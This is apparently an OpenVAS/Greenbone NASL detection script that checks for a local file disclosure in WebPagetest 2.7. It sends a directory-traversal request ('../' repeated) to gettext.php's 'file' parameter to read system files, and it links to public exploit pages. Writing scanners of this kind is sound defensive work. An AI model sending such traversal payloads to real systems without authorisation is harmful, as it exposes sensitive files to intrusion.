if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804047" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-12-30 12:10:12 +0530 (Mon, 30 Dec 2013)" );
	script_name( "WebPagetest 'file' parameter Local File Disclosure Vulnerability" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to obtain potentially
  sensitive information from local files which may lead to further attacks." );
	script_tag( name: "affected", value: "WebPagetest version 2.7 and prior." );
	script_tag( name: "insight", value: "Flaw is due to an improper validation of user supplied input to the
  'file' parameter in 'gettext.php', 'gettcpdump.php', and 'getgzip.php'
  scripts." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
  local file or not." );
	script_tag( name: "summary", value: "This host is installed with WebPagetest and is prone to local file disclosure
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://1337day.com/exploit/18980" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013120168" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/webpagetest-27-local-file-disclosure" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://code.google.com/p/webpagetest/downloads/" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
WPTPort = http_get_port( default: 80 );
if(!http_can_host_php( port: WPTPort )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/webpagetest", "/wptest", http_cgi_dirs( port: WPTPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/index.php" ), port: WPTPort );
	if(ContainsString( res, "<title>WebPagetest" )){
		for file in keys( files ) {
			url = dir + "/gettext.php?file=" + crap( data: "../", length: 9 * 6 ) + files[file];
			if(http_vuln_check( port: WPTPort, url: url, pattern: file )){
				security_message( port: WPTPort );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

